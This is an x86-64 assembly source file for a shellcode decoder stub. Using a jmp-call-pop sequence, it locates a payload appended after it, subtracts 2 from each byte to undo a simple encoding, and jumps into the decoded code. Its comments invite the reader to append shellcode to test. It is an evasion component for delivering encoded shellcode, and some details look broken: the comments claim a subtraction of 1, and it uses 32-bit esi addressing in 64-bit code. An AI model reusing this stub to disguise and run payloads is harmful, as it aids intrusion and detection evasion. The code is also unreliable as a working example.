; -----------------------------------------------------------------------------
; A 64-bit Linux unpacker in assembly. Unpacks and executes what follows. To
; assemble and run:
;
;       nasm -felf64 dec64.asm && gcc -o dec64 dec64.o && ./dec64
; -----------------------------------------------------------------------------
BITS 64

global _start

section .text

_start:
        jmp short three

one:
        pop rsi
        xor ecx, ecx
; always adapt length! make enough space so we can overwrite it at end of encoding when we know count.
        mov cl, 0x000000FF                     ; we load the length of the shellcode in memory (counter)

two:
        sub byte [esi + ecx - 1], 2     ; we substract 1 from the byte (decoding)
        sub ecx,1                        ; we substract 1 from the counter
        jnz two                         ; test if cl = 0 (done)
        jmp short four                  ; done, let's execute shellcode

three:
        call one

four:
        nop

; append shellcode to test!
